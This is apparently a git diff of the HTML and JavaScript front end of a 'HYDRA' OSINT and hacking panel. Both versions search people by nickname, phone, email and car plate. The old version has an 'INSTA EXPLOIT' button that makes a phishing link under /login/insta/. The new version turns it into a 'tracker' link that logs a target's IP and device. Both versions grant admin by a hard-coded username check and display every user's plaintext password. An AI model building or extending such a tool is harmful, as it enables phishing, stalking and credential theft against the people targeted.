@@ -2,126 +2,107 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>HYDRA MONSTER OSINT</title>
+    <title>HYDRA ULTIMATE TERMINAL</title>
     <style>
-        :root { --green: #00ff41; --black: #050505; --red: #ff0000; }
-        body { background: var(--black); color: var(--green); font-family: monospace; padding: 20px; }
-        .card { border: 1px solid var(--green); padding: 15px; margin-bottom: 15px; position: relative; }
-        .card-label { position: absolute; top: -10px; left: 10px; background: var(--black); padding: 0 5px; font-size: 12px; }
-        .input-row { display: flex; gap: 10px; margin-bottom: 10px; }
-        input { background: #000; border: 1px solid var(--green); color: var(--green); padding: 5px; flex-grow: 1; }
-        .btn { background: var(--green); color: #000; border: none; padding: 8px 15px; cursor: pointer; font-weight: bold; }
-        .btn:hover { background: #fff; }
-        #display { border: 1px solid #444; min-height: 100px; padding: 10px; margin-top: 10px; font-size: 12px; color: #fff; background: #111; }
-        .res-item { border-bottom: 1px solid #222; padding: 5px; display: flex; justify-content: space-between; align-items: center; }
-        .copy-btn { font-size: 10px; border: 1px solid var(--green); background: none; color: var(--green); cursor: pointer; padding: 2px 5px; }
+        :root { --p: #00ff41; --bg: #050505; --red: #ff3e3e; }
+        body { background: var(--bg); color: var(--p); font-family: 'Courier New', monospace; overflow-x: hidden; }
+        .matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.1; pointer-events: none; }
+        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
+        .card { border: 1px solid var(--p); padding: 15px; margin-bottom: 20px; background: rgba(0,20,0,0.8); box-shadow: 0 0 10px var(--p); }
+        .glitch { animation: glitch 1s linear infinite; font-weight: bold; font-size: 24px; text-align: center; }
+        @keyframes glitch { 0% { text-shadow: 2px 0 red; } 50% { text-shadow: -2px 0 blue; } 100% { text-shadow: 2px 0 red; } }
+        input { background: #000; border: 1px solid var(--p); color: var(--p); padding: 10px; width: calc(100% - 22px); margin-bottom: 10px; }
+        .btn { background: var(--p); color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.3s; }
+        .btn:hover { background: #fff; transform: scale(1.02); }
+        #console { background: #000; border: 1px solid #333; height: 200px; overflow-y: auto; padding: 10px; font-size: 13px; color: #fff; }
+        .res-line { border-bottom: 1px solid #222; padding: 5px 0; display: flex; justify-content: space-between; }
     </style>
 </head>
 <body>
-    <h1>HYDRA OSINT v15.5</h1>
-    
-    <div class="card" id="auth-ui">
-        <span class="card-label">// ACCESS CONTROL</span>
-        <div class="input-row">
-            <input id="user" placeholder="LOGIN"> 
-            <input id="pass" type="password" placeholder="PASSWORD">
-        </div>
-        <button class="btn" onclick="auth('login')">LOGIN</button>
-        <button class="btn" onclick="auth('register')" style="background:none; color:var(--green); border:1px solid var(--green);">REGISTER</button>
-    </div>
-
-    <div id="main-ui" style="display:none;">
-        <div class="card">
-            <span class="card-label">// INSTA EXPLOIT</span>
-            <button class="btn" onclick="genPhish()" style="width:100%; background:var(--red); color:#fff; border: 1px solid #fff;">[ !!! ] START INSTA HACK [ !!! ]</button>
+    <div class="matrix-bg" id="mx"></div>
+    <div class="container">
+        <div class="glitch">HYDRA MONSTER TERMINAL v2026</div>
+        
+        <div class="card" id="auth-box">
+            <input id="u" placeholder="OPERATOR ID">
+            <input id="p" type="password" placeholder="ACCESS KEY">
+            <button class="btn" onclick="login()">INITIATE LOGIN</button>
         </div>
 
-        <div class="card">
-            <span class="card-label">// OSINT MODULES</span>
-            <div class="input-row"><input id="t-nick" placeholder="Username..."><button class="btn" onclick="scan('nick')">NICK</button></div>
-            <div class="input-row"><input id="t-phone" placeholder="Phone..."><button class="btn" onclick="scan('mail')">PHONE</button></div>
-            <div class="input-row"><input id="t-email" placeholder="Email..."><button class="btn" onclick="scan('email_scan')">EMAIL</button></div>
-            <div class="input-row"><input id="t-car" placeholder="Car Plate..."><button class="btn" onclick="scan('car_scan')">CAR</button></div>
-            <div class="input-row"><input type="file" id="t-photo-new"><button class="btn" onclick="uploadPhotoMap()">GPS MAP</button></div>
-        </div>
+        <div id="main-ui" style="display:none;">
+            <div class="card">
+                <div style="color:var(--red); font-size: 10px; margin-bottom: 5px;">// GLOBAL INTELLIGENCE SEARCH</div>
+                <input id="q" placeholder="Enter Nick, Phone, Email or Car Plate..." onkeypress="if(event.key==='Enter') globalSearch()">
+                <button class="btn" onclick="globalSearch()">EXECUTE SEARCH</button>
+            </div>
 
-        <div id="display">> SYSTEM READY...</div>
+            <div class="card" style="border-color: var(--red);">
+                <button class="btn" style="background:var(--red); color:#fff;" onclick="genTracker()">GENERATE TRACKER & EXPLOIT</button>
+            </div>
 
-        <div class="card" id="history-box" style="margin-top:15px;">
-            <span class="card-label">// RECENT ACTIVITY</span>
-            <div id="hist-content"></div>
-        </div>
+            <div id="console">> AWAITING COMMAND...</div>
 
-        <div id="admin-panel" style="display:none; margin-top:20px;">
-            <button class="btn" onclick="loadAdmin()" style="width:100%; border: 2px solid gold;">OPEN MASTER ADMIN PANEL</button>
-            <div id="admin-data" class="card" style="display:none; margin-top:10px; border-color: gold;"></div>
+            <div class="card" id="admin-btn" style="display:none; border-color: gold;">
+                <button class="btn" style="background:gold;" onclick="loadAdmin()">MASTER CONTROL PANEL</button>
+            </div>
         </div>
     </div>
 
     <script>
         let UID = null;
-        async function auth(type) {
-            const u = document.getElementById('user').value, p = document.getElementById('pass').value;
-            const r = await fetch(`/api/${type}`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({username:u, password:p})});
+        async function login() {
+            const r = await fetch('/api/login', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({username:u.value, password:p.value})});
             const j = await r.json();
             if(j.status==='success') {
-                if(type==='login') {
-                    UID = j.uid;
-                    document.getElementById('auth-ui').style.display = 'none';
-                    document.getElementById('main-ui').style.display = 'block';
-                    // ПРОВЕРКА АДМИНА
-                    if(u === 'abupaay') {
-                        document.getElementById('admin-panel').style.display = 'block';
-                    }
-                    loadHistory();
-                } else alert('Registration Successful!');
-            } else alert(j.message || 'Error');
+                UID = j.uid;
+                document.getElementById('auth-box').style.display = 'none';
+                document.getElementById('main-ui').style.display = 'block';
+                if(u.value === 'abupaay') document.getElementById('admin-btn').style.display = 'block';
+                print('ACCESS GRANTED. WELCOME, OPERATOR.');
+            } else { alert('ACCESS DENIED.'); }
         }
 
-        async function scan(mod) {
-            let val;
-            if(mod==='nick') val = document.getElementById('t-nick').value;
-            else if(mod==='mail') val = document.getElementById('t-phone').value;
-            else if(mod==='email_scan') val = document.getElementById('t-email').value;
-            else if(mod==='car_scan') val = document.getElementById('t-car').value;
-            
+        function print(msg) {
+            const c = document.getElementById('console');
+            c.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            c.scrollTop = c.scrollHeight;
+        }
+
+        async function globalSearch() {
+            const val = q.value;
+            let mod = 'nick';
+            if(val.includes('@')) mod = 'email_scan';
+            else if(!isNaN(val)) mod = 'mail';
+            else if(val.length > 5 && /[0-9]/.test(val)) mod = 'car_scan';
+
+            print(`INITIALIZING ${mod.toUpperCase()} MODULE...`);
             const r = await fetch(`/api/${mod}?target=${val}`);
             const j = await r.json();
-            const disp = document.getElementById('display');
             if(j.status==='Success') {
-                disp.innerHTML = j.found.map(i => `<div class="res-item"><span>${i.name}</span><button class="copy-btn" onclick="window.open('${i.url}')">OPEN</button></div>`).join("");
-                loadHistory();
+                let resTxt = j.found.map(i => i.name).join(", ");
+                document.getElementById('console').innerHTML += `<div class="res-line"><span>FOUND: ${resTxt}</span><button onclick="savePDF('${mod}','${val}','${resTxt}')">SAVE PDF</button></div>`;
             }
         }
 
-        async function uploadPhotoMap() {
-            const file = document.getElementById("t-photo-new").files[0], disp = document.getElementById("display");
-            if(!file) return;
-            const fd = new FormData(); fd.append("image", file);
-            const r = await fetch("/api/photo_gps", {method:"POST", body:fd});
-            const j = await r.json();
-            if(j.status==="success") {
-                disp.innerHTML = `<div class="res-item"><span>COORDS: ${j.lat}, ${j.lon}</span><button class="copy-btn" onclick="window.open('${j.map}')">VIEW MAP</button></div>`;
-            } else disp.innerHTML = "> " + j.msg;
-        }
-
-        function genPhish() {
+        function genTracker() {
             const link = window.location.origin + '/login/insta/' + UID;
-            document.getElementById('display').innerHTML = `<div class="res-item"><span>TARGET LINK: ${link}</span><button class="copy-btn" onclick="navigator.clipboard.writeText('${link}'); alert('Copied!')">COPY</button></div>`;
+            print(`TRACKER LIVE: ${link}`);
+            navigator.clipboard.writeText(link);
+            alert('Link copied! Target IP and Device will be logged upon click.');
         }
 
-        async function loadHistory() {
-            const r = await fetch('/api/history');
-            const j = await r.json();
-            document.getElementById('hist-content').innerHTML = j.map(h => `<div>[${h.time}] ${h.module}: ${h.target}</div>`).join("");
+        async function savePDF(m, t, r) {
+            const resp = await fetch('/api/pdf', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({module:m, target:t, res:r})});
+            const blob = await resp.blob();
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a'); a.href = url; a.download = 'REPORT.pdf'; a.click();
         }
 
         async function loadAdmin() {
             const r = await fetch('/api/admin/users');
             const j = await r.json();
-            const box = document.getElementById('admin-data');
-            box.style.display = 'block';
-            box.innerHTML = j.map(u => `<div style="border-bottom:1px solid #444; margin-bottom:10px;"><b>USER: ${u.username}</b> | PASS: ${u.password}<br><small style="color:var(--green);">Actions: ${u.activity.map(a => a.mod).join(", ")}</small></div>`).join("");
+            print("--- MASTER USER LIST ---");
+            j.forEach(user => print(`USER: ${user.username} | PASS: ${user.password}`));
         }
     </script>
 </body>
